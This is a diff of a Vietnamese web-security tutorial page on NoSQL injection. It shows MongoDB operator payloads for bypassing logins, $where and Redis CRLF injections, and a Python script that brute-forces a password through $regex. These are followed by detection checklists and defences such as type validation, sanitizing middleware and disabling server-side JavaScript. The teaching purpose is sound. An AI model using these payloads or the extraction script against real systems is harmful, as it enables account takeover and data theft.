@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Chương 13: NoSQL Injection — Hieu Nguyen</title>
-  <meta name="description" content="NoSQL operator injection, type validation, disable $where.">
+  <meta name="description" content="Chương 13: NoSQL Injection — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,45 +40,335 @@
         <span>›</span>
         <span>13. NoSQLi</span>
       </div>
-      <h1>Chương 13: NoSQL Injection</h1>
-      <p class="lede">Mongo/Redis không phải “hết injection”. Operator và JSON type mới là cửa.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> IV — Injection</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>NoSQL nhận object/operator chứ không chỉ string. Nếu parser HTTP nhét JSON operator vào query login, điều kiện trở thành luôn đúng hoặc chạy JS (<code>$where</code>).</p>
-<h2 id="phong">Phòng chống</h2>
-<ul>
-        <li>Validate type: password phải string, không object.</li>
-        <li>Không nhét raw JSON user vào filter.</li>
-        <li>Tắt JS server-side trên Mongo nếu không cần.</li>
-        <li>Redis: không COMPOSITE lệnh từ user; dùng API an toàn.</li>
-      </ul>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>Mongo bind nội bộ, auth + TLS. Không expose 27017. Backup không public bucket.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Type check input.</li>
-        <li>Không tin operator từ client.</li>
-        <li>Tắt feature nguy hiểm.</li>
-        <li>DB không public.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>Operator injection khác SQLi string chỗ nào?</li>
-        <li>$where rủi ro gì?</li>
-        <li>Vì sao Content-Type JSON vs form đổi payload?</li>
-        <li>Redis injection thường đi với anti-pattern nào?</li>
-        <li>NetworkPolicy giúp gì?</li>
-      </ol>
+      <div id="top"></div>
+<header><h1>Chương 13: NoSQL Injection</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>NoSQL Injection</strong> là biến thể của injection attack nhắm vào các database NoSQL (MongoDB, CouchDB, Redis, etc.) thay vì SQL databases. Kỹ thuật tấn công khác nhau nhưng hậu quả tương tự: bypass authentication, đọc dữ liệu trái phép, hoặc xóa data.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Cao — Đặc biệt với MongoDB vì widespread usage trong microservices.</p>
+<hr>
+<h2 id="nosql-khác-sql-như-thế-nào">NoSQL Khác SQL Như Thế Nào?</h2>
+<table><thead><tr><th>Đặc điểm</th><th>SQL</th><th>NoSQL (MongoDB)</th></tr></thead><tbody><tr><td>Query language</td><td>SQL text</td><td>JSON operators</td></tr><tr><td>Structure</td><td>Tables/Rows</td><td>Collections/Documents</td></tr><tr><td>Schema</td><td>Fixed</td><td>Flexible</td></tr><tr><td>Injection vector</td><td>SQL keywords</td><td>JSON operators ($where, $regex)</td></tr></tbody></table>
+<hr>
+<h2 id="mongodb-nosql-injection">MongoDB NoSQL Injection</h2>
+<h3 id="1-operator-injection">1. Operator Injection</h3>
+<p>MongoDB dùng JSON operators trong queries:</p>
+<pre><code class="language-javascript">// Normal query
+db.users.find({username: &quot;alice&quot;, password: &quot;pass123&quot;})
 
-      <div class="docs-tags">
-        <span class="docs-tag">nosql</span>
-        <span class="docs-tag">mongodb</span>
-        <span class="docs-tag">injection</span>
-      </div>
+// App nhận từ request body JSON:
+// {&quot;username&quot;: &quot;alice&quot;, &quot;password&quot;: &quot;pass123&quot;}
+</code></pre>
+<p><strong>Tấn công bằng MongoDB operators:</strong></p>
+<pre><code class="language-json">// Thay password bằng operator
+{
+    &quot;username&quot;: &quot;admin&quot;,
+    &quot;password&quot;: {&quot;$ne&quot;: null}
+}
+</code></pre>
+<p>Query trở thành:</p>
+<pre><code class="language-javascript">db.users.find({username: &quot;admin&quot;, password: {$ne: null}})
+// $ne: not equal → password != null → đúng với mọi user có password
+// → Login thành công mà không cần biết password!
+</code></pre>
+<p><strong>Các operators phổ biến:</strong></p>
+<pre><code class="language-json">// $ne (not equal) - bypass password
+{&quot;password&quot;: {&quot;$ne&quot;: &quot;wrong&quot;}}
+{&quot;password&quot;: {&quot;$ne&quot;: null}}
+
+// $gt (greater than) - bypass numeric check  
+{&quot;age&quot;: {&quot;$gt&quot;: 0}}
+
+// $regex - bypass bằng regex
+{&quot;username&quot;: {&quot;$regex&quot;: &quot;admin&quot;}}
+{&quot;username&quot;: {&quot;$regex&quot;: &quot;.*&quot;}}
+
+// $where - JavaScript execution (rất nguy hiểm!)
+{&quot;$where&quot;: &quot;this.username === &#x27;admin&#x27;&quot;}
+{&quot;$where&quot;: &quot;sleep(5000) || true&quot;}  // DoS
+
+// $exists
+{&quot;admin&quot;: {&quot;$exists&quot;: true}}
+
+// In array
+{&quot;role&quot;: {&quot;$in&quot;: [&quot;admin&quot;, &quot;superuser&quot;]}}
+</code></pre>
+<h3 id="2-where-injection--javascript-execution">2. $where Injection — JavaScript Execution</h3>
+<p><code>$where</code> cho phép chạy JavaScript expressions trong MongoDB query:</p>
+<pre><code class="language-javascript">// Vulnerable code
+db.users.find({$where: `this.username === &#x27;${username}&#x27;`})
+
+// Normal: username = &quot;alice&quot;
+// Query: {$where: &quot;this.username === &#x27;alice&#x27;&quot;}
+
+// Injection: username = &quot;&#x27; || &#x27;1&#x27;==&#x27;1&quot;
+// Query: {$where: &quot;this.username === &#x27;&#x27; || &#x27;1&#x27;==&#x27;1&#x27;&quot;}
+// → Return tất cả documents!
+
+// Injection: username = &quot;&#x27;; sleep(5000); //&quot;  
+// → Time-based blind injection (DoS nếu nhiều requests)
+</code></pre>
+<p><strong>Extract data qua $where:</strong></p>
+<pre><code class="language-javascript">// username = &quot;&#x27; || (this.password[0] === &#x27;p&#x27;) || &#x27;0&#x27;==&#x27;1&quot;
+// → Nếu true: return user → đoán từng ký tự password
+
+// Automation:
+for char in &#x27;abcdefghijklmnopqrstuvwxyz&#x27;:
+    payload = f&quot;&#x27; || (this.password[0] === &#x27;{char}&#x27;) || &#x27;0&#x27;==&#x27;1&quot;
+    response = login(admin, payload)
+    if response.ok:
+        print(f&quot;First char of password: {char}&quot;)
+</code></pre>
+<h3 id="3-http-parameter-pollution">3. HTTP Parameter Pollution</h3>
+<p>Khi app nhận query params và chuyển thành MongoDB query:</p>
+<pre><code class="language-text">GET /api/login?username=admin&amp;password=pass
+
+→ db.users.find({username: &quot;admin&quot;, password: &quot;pass&quot;})
+
+Bypass bằng PHP array notation:
+GET /api/login?username=admin&amp;password[$ne]=invalid
+
+→ db.users.find({username: &quot;admin&quot;, password: {$ne: &quot;invalid&quot;}})
+→ Login without password!
+</code></pre>
+<p><strong>Express.js (Node.js) vulnerable:</strong></p>
+<pre><code class="language-javascript">// Vulnerable
+app.post(&#x27;/login&#x27;, (req, res) =&gt; {
+    const { username, password } = req.body;
+    // req.body có thể là: {password: {$ne: null}}
+    User.findOne({username, password}, ...);
+});
+</code></pre>
+<h3 id="4-aggregation-pipeline-injection">4. Aggregation Pipeline Injection</h3>
+<pre><code class="language-javascript">// Vulnerable
+db.collection.aggregate([
+    {$match: {userId: userId}},
+    {$lookup: {from: &quot;orders&quot;, localField: &quot;_id&quot;, foreignField: &quot;userId&quot;, as: &quot;orders&quot;}},
+])
+
+// userId = {$gt: &quot;&quot;} → match tất cả documents
+</code></pre>
+<hr>
+<h2 id="redis-injection">Redis Injection</h2>
+<p>Redis commands qua web interface:</p>
+<pre><code class="language-text"># Nếu app build Redis commands từ user input:
+GET /data?key=user:1337
+
+Redis: GET user:1337
+
+# Injection: key = user:1337\r\nDEL user:1\r\n
+# Gửi multiple Redis commands qua CRLF injection
+</code></pre>
+<hr>
+<h2 id="kịch-bản-tấn-công-authentication-bypass">Kịch bản tấn công: Authentication Bypass</h2>
+<pre><code class="language-text">Target: Node.js app + MongoDB login
+
+POST /api/login HTTP/1.1
+Content-Type: application/json
+
+{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: {&quot;$ne&quot;: null}}
+
+Server code:
+async function login(req, res) {
+    const user = await User.findOne({
+        username: req.body.username,
+        password: req.body.password  // ← Không validate type!
+    });
+    
+    if (user) return res.json({token: generateToken(user)});
+    res.status(401).json({error: &quot;Invalid credentials&quot;});
+}
+
+Query thực thi: db.users.findOne({username: &quot;admin&quot;, password: {$ne: null}})
+→ Match với admin user (password not null)
+→ Return admin user → login thành công!
+</code></pre>
+<hr>
+<h2 id="blind-nosql-injection--data-extraction">Blind NoSQL Injection — Data Extraction</h2>
+<pre><code class="language-python"># Extract password từng ký tự bằng $regex
+
+import requests
+import string
+
+target = &quot;https://example.com/api/login&quot;
+headers = {&quot;Content-Type&quot;: &quot;application/json&quot;}
+
+known_password = &quot;&quot;
+charset = string.ascii_lowercase + string.digits + &quot;!@#$%^&amp;*&quot;
+
+for position in range(20):  # Max password length
+    found = False
+    for char in charset:
+        payload = {
+            &quot;username&quot;: &quot;admin&quot;,
+            &quot;password&quot;: {
+                &quot;$regex&quot;: f&quot;^{re.escape(known_password + char)}&quot;
+            }
+        }
+        
+        response = requests.post(target, json=payload, headers=headers)
+        
+        if response.status_code == 200:
+            known_password += char
+            found = True
+            print(f&quot;Password so far: {known_password}&quot;)
+            break
+    
+    if not found:
+        break
+
+print(f&quot;Full password: {known_password}&quot;)
+</code></pre>
+<hr>
+<h2 id="cách-phát-hiện">Cách phát hiện</h2>
+<pre><code class="language-text">□ Thử MongoDB operators trong JSON body: {&quot;$ne&quot;: null}, {&quot;$gt&quot;: &quot;&quot;}
+□ Thử PHP-style array notation trong query params: ?pass[$ne]=x
+□ Error messages mention MongoDB/NoSQL
+□ Behavior thay đổi với operator injection vs. normal input
+□ Time-based: {&quot;$where&quot;: &quot;sleep(5000) || true&quot;}
+□ Check nếu app dùng $where operator
+□ Thử inject operators vào mọi field trong JSON body
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<h3 id="1-input-type-validation">1. Input Type Validation</h3>
+<pre><code class="language-javascript">// Node.js với Mongoose
+const loginSchema = {
+    username: { type: String, required: true },
+    password: { type: String, required: true }
+};
+
+app.post(&#x27;/login&#x27;, (req, res) =&gt; {
+    const { error, value } = Joi.object(loginSchema).validate(req.body);
+    
+    if (error) return res.status(400).json({error: &quot;Invalid input format&quot;});
+    
+    // Đảm bảo username và password là strings
+    const { username, password } = value;
+    
+    // Bây giờ safe vì Joi đã validate types
+    User.findOne({username, password: hashPassword(password)})
+});
+</code></pre>
+<h3 id="2-sanitize-input">2. Sanitize Input</h3>
+<pre><code class="language-javascript">// Express với mongo-sanitize
+const mongoSanitize = require(&#x27;express-mongo-sanitize&#x27;);
+
+// Middleware: remove keys bắt đầu bằng $
+app.use(mongoSanitize());
+
+// Hoặc manual:
+function sanitizeQuery(input) {
+    if (typeof input === &#x27;object&#x27; &amp;&amp; input !== null) {
+        for (let key of Object.keys(input)) {
+            if (key.startsWith(&#x27;$&#x27;)) {
+                delete input[key];
+            } else {
+                sanitizeQuery(input[key]);
+            }
+        }
+    }
+    return input;
+}
+</code></pre>
+<h3 id="3-disable-dangerous-features">3. Disable Dangerous Features</h3>
+<pre><code class="language-javascript">// Mongoose: Disable $where operator
+mongoose.connect(uri, {
+    // Mongoose không trực tiếp expose $where qua model methods
+    // Nhưng tránh dùng raw queries với $where
+});
+
+// Nếu cần raw query, validate trước
+const allowedOperators = [&#x27;$eq&#x27;, &#x27;$gt&#x27;, &#x27;$lt&#x27;, &#x27;$gte&#x27;, &#x27;$lte&#x27;, &#x27;$in&#x27;];
+
+function validateQuery(query) {
+    function checkOperators(obj) {
+        if (typeof obj !== &#x27;object&#x27;) return;
+        for (const key of Object.keys(obj)) {
+            if (key.startsWith(&#x27;$&#x27;) &amp;&amp; !allowedOperators.includes(key)) {
+                throw new Error(`Operator ${key} not allowed`);
+            }
+            checkOperators(obj[key]);
+        }
+    }
+    checkOperators(query);
+}
+</code></pre>
+<h3 id="4-parameterized-queries-nosql-equivalent">4. Parameterized Queries (NoSQL equivalent)</h3>
+<pre><code class="language-python"># Python với PyMongo
+from pymongo import MongoClient
+from bson import ObjectId
+
+client = MongoClient(&#x27;mongodb://localhost:27017&#x27;)
+db = client.mydb
+
+# ĐÚNG: Dùng parameters riêng biệt, không string concat
+def find_user(username, password_hash):
+    return db.users.find_one({
+        &#x27;username&#x27;: username,  # String literal, không thể inject operator
+        &#x27;password&#x27;: password_hash
+    })
+
+# SAI: Build query từ untrusted dict
+def find_user_bad(query_dict):
+    return db.users.find_one(query_dict)  # ← Hacker control toàn bộ query!
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>MongoDB Security Config:</strong></p>
+<pre><code class="language-yaml"># mongod.conf
+security:
+  authorization: enabled  # Enable authentication
+  javascriptEnabled: false  # QUAN TRỌNG: Disable JavaScript execution ($where)
+
+net:
+  bindIp: 127.0.0.1  # Không bind 0.0.0.0
+
+# Không expose MongoDB port ra internet!
+</code></pre>
+<p><strong>Kubernetes MongoDB:</strong></p>
+<pre><code class="language-yaml"># MongoDB chỉ accessible trong cluster
+apiVersion: v1
+kind: Service
+metadata:
+  name: mongodb
+spec:
+  type: ClusterIP  # Internal only
+  selector:
+    app: mongodb
+  ports:
+    - port: 27017
+</code></pre>
+<p><strong>Auth với minimal privileges:</strong></p>
+<pre><code class="language-javascript">// Tạo user với quyền tối thiểu
+use mydb
+db.createUser({
+    user: &quot;app_user&quot;,
+    pwd: &quot;strong_password&quot;,
+    roles: [
+        { role: &quot;readWrite&quot;, db: &quot;mydb&quot; }
+        // Không phải dbAdmin hay clusterAdmin
+    ]
+})
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>NoSQL Injection dùng database-specific operators thay vì SQL keywords.</li>
+<li>MongoDB dễ bị operator injection ($ne, $gt, $regex, $where) nếu không validate input types.</li>
+<li><code>$where</code> operator cho phép JavaScript execution — đặc biệt nguy hiểm.</li>
+<li>Phòng chống: validate types (string chứ không phải object), sanitize operators, disable javascriptEnabled.</li>
+<li>express-mongo-sanitize là middleware hữu ích cho Node.js apps.</li>
+<li>Không expose MongoDB port ra ngoài — luôn dùng ClusterIP trong K8s.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>Tại sao <code>{&quot;password&quot;: {&quot;$ne&quot;: null}}</code> bypass MongoDB authentication?</li>
+<li>Sự khác biệt giữa SQL injection và NoSQL operator injection là gì?</li>
+<li><code>$where</code> operator trong MongoDB nguy hiểm như thế nào?</li>
+<li>Làm thế nào để phòng chống NoSQL injection trong Express.js application?</li>
+<li>Tại sao <code>javascriptEnabled: false</code> trong mongod.conf quan trọng?</li>
+</ol>
       <div class="docs-pager">
         <a href="../12/">Previous · 12. SQLi</a>
         <a href="../14/">Next · 14. Command Injection</a>
@@ -87,11 +377,25 @@
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#nosql-khác-sql-như-thế-nào">NoSQL Khác SQL Như Thế Nào?</a>
+        <a href="#mongodb-nosql-injection">MongoDB NoSQL Injection</a>
+        <a class="depth-3" href="#1-operator-injection">1. Operator Injection</a>
+        <a class="depth-3" href="#2-where-injection--javascript-execution">2. $where Injection — JavaScript Execution</a>
+        <a class="depth-3" href="#3-http-parameter-pollution">3. HTTP Parameter Pollution</a>
+        <a class="depth-3" href="#4-aggregation-pipeline-injection">4. Aggregation Pipeline Injection</a>
+        <a href="#redis-injection">Redis Injection</a>
+        <a href="#kịch-bản-tấn-công-authentication-bypass">Kịch bản tấn công: Authentication Bypass</a>
+        <a href="#blind-nosql-injection--data-extraction">Blind NoSQL Injection — Data Extraction</a>
+        <a href="#cách-phát-hiện">Cách phát hiện</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a class="depth-3" href="#1-input-type-validation">1. Input Type Validation</a>
+        <a class="depth-3" href="#2-sanitize-input">2. Sanitize Input</a>
+        <a class="depth-3" href="#3-disable-dangerous-features">3. Disable Dangerous Features</a>
+        <a class="depth-3" href="#4-parameterized-queries-nosql-equivalent">4. Parameterized Queries (NoSQL equivalent)</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
